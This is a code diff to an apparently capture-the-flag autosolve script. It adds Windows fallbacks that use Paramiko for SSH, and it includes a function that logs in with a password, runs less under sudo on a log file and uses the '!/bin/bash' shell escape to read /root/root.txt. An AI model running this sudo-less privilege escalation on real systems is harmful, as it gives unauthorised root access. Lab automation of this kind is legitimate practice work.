@@ -4,11 +4,8 @@ import ftplib
 import http.cookiejar
 import io
 import os
-import pty
 import re
-import select
 import shlex
-import signal
 import subprocess
 import sys
 import tarfile
@@ -16,6 +13,21 @@ import tempfile
 import time
 import urllib.parse
 import urllib.request
+
+try:
+    import pty
+except ImportError:
+    pty = None
+
+try:
+    import select
+except ImportError:
+    select = None
+
+try:
+    import signal
+except ImportError:
+    signal = None
 
 
 BEGIN = "HF_AUTOSOLVE_BEGIN"
@@ -204,6 +216,9 @@ def shutil_which(binary):
 
 
 def run_ssh_command(target, user, password, remote_command, timeout=30):
+    if pty is None or select is None:
+        return run_ssh_command_paramiko(target, user, password, remote_command, timeout=timeout)
+
     argv = [
         "ssh",
         "-o",
@@ -217,6 +232,9 @@ def run_ssh_command(target, user, password, remote_command, timeout=30):
 
 
 def run_less_privesc(target, user, password, timeout=40):
+    if pty is None or select is None:
+        return run_less_privesc_paramiko(target, user, password, timeout=timeout)
+
     argv = [
         "ssh",
         "-tt",
@@ -236,7 +254,91 @@ def run_less_privesc(target, user, password, timeout=40):
     )
 
 
+def load_paramiko():
+    try:
+        import paramiko
+
+        return paramiko
+    except ImportError:
+        fail(
+            "Windows Python has no pty/termios support. Install Paramiko with "
+            "`py -m pip install paramiko` or run autosolve.py from Linux/WSL."
+        )
+
+
+def open_paramiko_client(target, user, password, timeout):
+    paramiko = load_paramiko()
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    client.connect(
+        hostname=target,
+        username=user,
+        password=password,
+        look_for_keys=False,
+        allow_agent=False,
+        timeout=timeout,
+        banner_timeout=timeout,
+        auth_timeout=timeout,
+    )
+    return client
+
+
+def run_ssh_command_paramiko(target, user, password, remote_command, timeout=30):
+    client = open_paramiko_client(target, user, password, timeout)
+    try:
+        _, stdout, stderr = client.exec_command(remote_command, timeout=timeout)
+        return stdout.read().decode(errors="replace") + stderr.read().decode(errors="replace")
+    finally:
+        client.close()
+
+
+def run_less_privesc_paramiko(target, user, password, timeout=40):
+    client = open_paramiko_client(target, user, password, timeout)
+    output = []
+    start = time.monotonic()
+    sent_sudo = False
+    sent_escape = False
+    stop_re = re.compile(r"FLAG\{[0-9a-f]{32}\}")
+
+    try:
+        channel = client.invoke_shell(term="xterm", width=120, height=40)
+        channel.settimeout(0.2)
+
+        while time.monotonic() - start <= timeout:
+            if not sent_sudo:
+                channel.send("sudo /usr/bin/less /var/log/glpi/helpforge.log\n")
+                sent_sudo = True
+                next_escape_at = time.monotonic() + 1.5
+
+            if sent_sudo and not sent_escape and time.monotonic() >= next_escape_at:
+                channel.send("!/bin/bash -c 'id; cat /root/root.txt'\n")
+                sent_escape = True
+
+            if channel.recv_ready():
+                text = channel.recv(4096).decode(errors="replace")
+                output.append(text)
+                if stop_re.search("".join(output)):
+                    break
+
+            time.sleep(0.1)
+
+        try:
+            channel.send("\nq\nexit\n")
+        except Exception:
+            pass
+    finally:
+        client.close()
+
+    return "".join(output)
+
+
 def run_pty(argv, password, after_login=None, stop_pattern=None, timeout=30):
+    if pty is None or select is None:
+        fail(
+            "This Python runtime does not support pty/termios. Install Paramiko with "
+            "`py -m pip install paramiko` or run autosolve.py from Linux/WSL."
+        )
+
     pid, fd = pty.fork()
     if pid == 0:
         os.execvp(argv[0], argv)
@@ -290,7 +392,7 @@ def run_pty(argv, password, after_login=None, stop_pattern=None, timeout=30):
             pass
         try:
             os.kill(pid, signal.SIGTERM)
-        except OSError:
+        except (OSError, AttributeError):
             pass
         try:
             os.waitpid(pid, 0)
